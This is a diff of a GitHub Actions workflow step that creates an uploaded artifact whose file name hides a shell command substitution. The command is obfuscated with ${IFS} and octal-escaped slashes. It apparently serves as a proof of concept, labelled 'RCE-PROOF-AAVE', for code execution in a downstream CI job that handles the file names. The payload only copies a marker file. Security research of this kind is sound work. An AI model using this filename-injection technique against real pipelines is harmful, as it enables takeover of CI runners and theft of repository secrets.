@@ -15,7 +15,11 @@ jobs:
           mkdir -p /tmp/content
           echo 1 > /tmp/content/pr_number.txt
           echo hello > /tmp/content/pwn.txt
-          touch '/tmp/content/$(printf pwn; echo RCE-PROOF-AAVE >> ${PATH:0:1}tmp${PATH:0:1}content${PATH:0:1}content${PATH:0:1}pwn.txt).txt'
+          echo 'RCE-PROOF-AAVE-MARKER' > /tmp/content/marker.txt
+          read -r f <<'NAME'
+          $(printf pwn; cp${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')marker.txt${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')pwn.txt).txt
+          NAME
+          touch "/tmp/content/$f"
           ls -la /tmp/content
       - uses: actions/upload-artifact@v4
         with:
